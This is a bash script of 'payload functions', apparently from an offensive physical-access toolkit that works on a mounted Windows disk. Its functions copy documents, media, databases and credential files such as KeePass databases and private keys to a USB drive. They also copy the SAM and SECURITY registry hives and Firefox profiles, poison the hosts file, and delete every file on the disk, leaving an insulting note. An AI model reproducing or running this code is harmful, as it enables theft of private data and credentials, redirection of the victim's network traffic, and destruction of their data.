#!/usr/bin/env bash

# slipstream payload functions
####################################################################
# Copyright 2025 nullcollective
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

function payload_exfiltrate_data {
    #---- EXFIL PATTERNS ----#
    local PICS='.*/.*\.(jpg|jpeg|png|gif)$'
    local VIDS='.*/.*\.(mp4|mkv|mov)$'
    local DOCS='.*/.*\.(doc|docx|pdf|txt|rtf|odt|tex)$'
    local DB='.*/.*\.(xls|xlsx|ods|tsv|csv|db|sqlite|mdb|accdb)$'
    local CREDS='.*/.*\.(kdb|kdbx|pem|key|cert|crt|ppk)$'
    local ARCH='.*/.*\.(zip|tar|gz|tgz|xz|exe|7z|rar)$'
    local SCRIPTS='.*/.*\.(sh|py|bat|ps1|js|pl)$'
    local OTHER='.*/.*\.(bak|tmp|log)$'

    for filetype in ${SEARCH};do
        pattern="${!filetype}"
        find "${TARGET_MOUNT}${BASE_SEARCH_PATH}"/* \
                               	-maxdepth ${SEARCH_DEPTH} \
                                -type f \
                                -regextype posix-extended \
                                -regex ${pattern} | \
                                while read -r foundfile; do
					echo "[discovered] ${foundfile}"
                                        rsync -Rah --protect-args --info=progress2 "${foundfile}" "${USB_MOUNT}/"
        done
    done
}

function payload_samcopy {
    local SAM_DIR="/Windows/System32/config/"
    cp -v "${TARGET_MOUNT}${SAM_DIR}"{SAM,SECURITY} "${USB_MOUNT}"
}

function payload_firefox_copy {
    local ffbase="/AppData/Roaming/Mozilla/Firefox/"
    local ffprofiles=$(find ${TARGET_MOUNT}/Users/*${ffbase} -maxdepth 1 -type d -name "Profiles")
    for profiles in ${ffprofiles};do
        echo "COPYING PROFILE: ${profiles}"
        rsync -Rah --protect-args --info=progress2 "${profiles}" "${USB_MOUNT}/"
    done
}

function payload_host_poison {
    hostfile="/Windows/System32/drivers/etc/hosts"
    if [ ! -f ${TARGET_MOUNT}${hostfile} ];then touch ${TARGET_MOUNT}${hostfile};fi 
    for entry in "${poisoned_hosts[@]}";do
        echo "${entry}" >> "${TARGET_MOUNT}${hostfile}"
    done
}

function payload_wipe_all_data {
    while true; do
        echo "WARNING: This will delete all data on ${TARGET_MOUNT} (${TARGET_DISK})"
        read -p "Do you want to proceed? (y/n) " yn
        case $yn in
            [yY]* ) echo "Running payload..."
                    find ${TARGET_MOUNT} -type f -delete
                    echo "FUCK OFF" > "${TARGET_MOUNT}/FUCKOFF.txt"
                    return 0;;
            [nN]* ) echo "Exiting..."; return 0;;
            * ) echo "Invalid response. Please enter 'y' or 'n'.";;
        esac
    done
}